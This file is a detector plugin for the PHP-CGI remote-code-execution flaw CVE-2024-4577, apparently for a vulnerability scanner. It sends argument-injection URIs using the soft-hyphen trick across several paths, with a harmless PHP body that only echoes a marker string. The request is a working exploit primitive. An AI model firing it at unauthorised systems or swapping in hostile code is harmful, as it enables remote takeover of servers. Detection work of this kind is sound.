@@ -1,0 +1,75 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "CVE-2024-4577 Detector"
+  author: "Leonardo Tamiano (leonardo.tamiano@mindedsecurity.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE-2024-4577"
+  }
+  severity: CRITICAL
+  title: "PHP RCE CVE-2024-4577"
+  description: "When using Apache and PHP, with CGI enabled on Windows, if the system is set up to use certain code pages (such as the Japanese locale), and if the version of PHP is vulnerable (8.3.* before 8.3.8, 8.2.* before 8.2.20, 8.1.* before 8.1.29), Windows may use 'Best-Fit' behavior to replace characters in the command line given to Win32 API functions. PHP CGI module may misinterpret those characters as PHP options, which may allow a malicious user to pass options to the PHP binary being run, allowing to achieve RCE."
+  recommendation: "Upgrade to non-vulnerable versions of PHP (8.3.8, 8.2.20, 8.1.29), or disable the CGI configuration."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-4577"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "verify_cgi_argument_injection"
+  http_request: {
+    method: POST
+    uri: [
+      "/?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+      "/index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+      "/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+      "/cgi-bin/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+      "/php/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+      "/test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
+    ]
+    headers: [
+      { name: "Content-Type" value: "text/plain" },
+      { name: "Redirect-Status" value: "1" }
+    ]
+    data: "<?php echo \"TSUNAMI_\" . (41829 * 23917) . \"_\" . md5(\"cve_2024_4577\"); die(); ?>"
+    client_options: {
+      disable_follow_redirects: true
+    }
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "TSUNAMI_1000424193_ec833cec3bf2079a68cbb47f5519d8df" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "verify_cgi_argument_injection"
+  ]
+}
